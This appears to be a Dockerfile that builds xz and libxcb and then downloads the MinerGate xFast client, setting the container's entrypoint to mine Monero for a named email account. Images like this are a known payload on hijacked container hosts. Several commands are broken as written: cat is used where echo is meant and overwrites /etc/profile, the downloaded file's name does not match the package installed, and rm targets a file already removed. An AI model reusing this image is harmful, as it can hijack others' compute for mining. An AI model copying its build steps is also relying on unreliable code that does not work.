FROM ubuntu:18.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        ca-certificates \
        wget \
        gcc \
    && rm -r /var/lib/apt/lists/*
    
RUN wget -q https://tukaani.org/xz/xz-5.2.3.tar.gz \
    && tar xvf xz-5.2.3.tar.gz \
    && cd xz-5.2.3 \
    && ./configure --prefix=/usr/local/xz \
    && make && make install

RUN cat "export XZ_HOME=/usr/local/xz" > /etc/profile \
    && cat "export PATH=$XZ_HOME/bin:$PATH" > /etc/profile \
    && source /etc/profile
    
RUN wget -q https://xorg.freedesktop.org/archive/individual/lib/libxcb-1.14.tar.xz \
    && xz -d libxcb-1.14.tar.xz \
    && tar xvf libxcb-1.14.tar  \
    && cp -r libxcb-1.14 /usr/bin/ \
    && rm libxcb-1.14.tar.xz
    
RUN wget -q https://minergate.com/download/xfast-ubuntu-cli \
    && dpkg -i MinerGate-xFast-cli-1.7-ubuntu.deb \
    && rm MinerGate-xFast-cli-1.7-ubuntu.deb

ENTRYPOINT ["minergate-cli"]
CMD ["-user", "haoseat@gmail.com", "-xmr", "2"]
